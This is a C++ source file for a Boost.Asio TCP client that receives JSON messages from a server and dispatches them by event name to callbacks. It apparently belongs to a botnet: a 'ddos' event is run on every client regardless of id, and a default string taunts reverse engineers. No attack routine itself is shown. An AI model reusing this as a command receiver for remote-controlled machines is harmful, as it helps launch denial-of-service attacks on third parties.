#include "ANetwork.hpp"

ANetwork::ANetwork() : _ioService(boost::asio::io_service()), _socket(boost::asio::io_service()) {
	this->_connected = false;
	this->_id = "undefined";
	this->_connectCallback = NULL;
	this->_disconnectCallback = NULL;
}

ANetwork::ANetwork(boost::asio::io_service& io_service,
    tcp::resolver::iterator const &endpoint_iterator) : _ioService(io_service), _socket(io_service) {
    this->_connectCallback = NULL;
    this->_disconnectCallback = NULL;
	this->_connected = false;
	this->_id = "undefined";
}

ANetwork::~ANetwork() {

}

void ANetwork::connect(tcp::resolver::iterator const &endpoint_iterator) {
	std::cout << "trying to connect..." << std::endl;
    boost::asio::async_connect(this->_socket, endpoint_iterator,
        [this](boost::system::error_code ec, tcp::resolver::iterator)
        {
            if (!ec) {
				this->_connectCallback("success");
                this->_readHeader();
				this->_connected = true;
			} else {
				this->_connected = false;
				this->_connectCallback("failure");
			}
        });
}

void ANetwork::disconnect() {
    this->_ioService.post([this]() { this->_socket.close(); });
	this->_connected = false;
	this->_disconnectCallback("disconnected");
}


void ANetwork::sendMessage(const direct::Message &msg) {
    this->_ioService.post(
		[this, msg]()
	{
		bool write_in_progress = !this->_writeMsg.empty();
		this->_writeMsg.push_back(msg);
		if (!write_in_progress)
		{
			this->_write();
		}
	});
}


void ANetwork::setReceive(std::string const &event, std::function<void(boost::property_tree::ptree &)> const &callback) {
	this->_receiveCallback.insert(std::make_pair<std::string const &, std::function<void(boost::property_tree::ptree &)> const &>(event, callback));
}

void ANetwork::setCallback(const CallbackType &callbackType, std::function<void(const std::string &)> const &callback) {
	switch (callbackType)
	{
	case INetwork::CallbackType::Connect:
		this->_connectCallback = callback;
		break;
	case INetwork::CallbackType::Disconnect:
		this->_disconnectCallback = callback;
		break;
	default:
		break;
	}
}

void ANetwork::_readHeader() {
    boost::asio::async_read(this->_socket,
        boost::asio::buffer(this->_readMsg.data(), direct::Message::header_length),
        [this](boost::system::error_code ec, std::size_t /*length*/)
        {
          if (!ec && this->_readMsg.decode_header())
          {
            this->_readBody();
          }
          else
          {
            std::cerr << "socket closed (from readHeader)" << std::endl;
			this->disconnect();
          }
        });
}

void ANetwork::_readBody() {
    boost::asio::async_read(this->_socket,
        boost::asio::buffer(this->_readMsg.body(), this->_readMsg.body_length()),
        [this](boost::system::error_code ec, std::size_t /*length*/)
        {
          if (!ec)
          {
			std::stringstream stream;
			stream.write(this->_readMsg.body(), this->_readMsg.body_length());
			this->_findEvent(stream.str());
            this->_readHeader();
          }
          else
          {
            std::cerr << "socket closed (from readBody)" << std::endl;
			this->disconnect();
          }
        });
}

void ANetwork::_write() {
    boost::asio::async_write(this->_socket,
        boost::asio::buffer(this->_writeMsg.front().data(),
          this->_writeMsg.front().length()),
        [this](boost::system::error_code ec, std::size_t /*length*/)
        {
          if (!ec)
          {
            this->_writeMsg.pop_front();
            if (!this->_writeMsg.empty())
            {
              this->_write();
            }
          }
          else
          {
            std::cerr << "socket closed (from write)" << std::endl;
			this->disconnect();
          }
        });
}

void ANetwork::_findEvent(std::string const &response) const {
	if (response.empty())
		return;
	std::cout << response << std::endl;
	std::string copy = response;
	copy = copy.substr(copy.find_first_of(" \t") + 1);
	
	std::istringstream rsp(response);
	std::string event;
	rsp >> event;

	std::stringstream ss;
	ss << copy;
	boost::property_tree::ptree root;
	try
	{
		boost::property_tree::read_json(ss, root);
		if (root.get<std::string>("client_id", "hello dear reverser") != this->_id && event != "ddos")
			return;
		this->_receiveCallback.at(event)(root);
	}
	catch (const std::exception &e)
	{
		std::cerr << "Command not found: " << event << " --> " << e.what() << std::endl;
	}
}

bool ANetwork::isConnected() const {
	return this->_connected;
}

void ANetwork::setClientId(std::string const &id) {
	this->_id = id;
}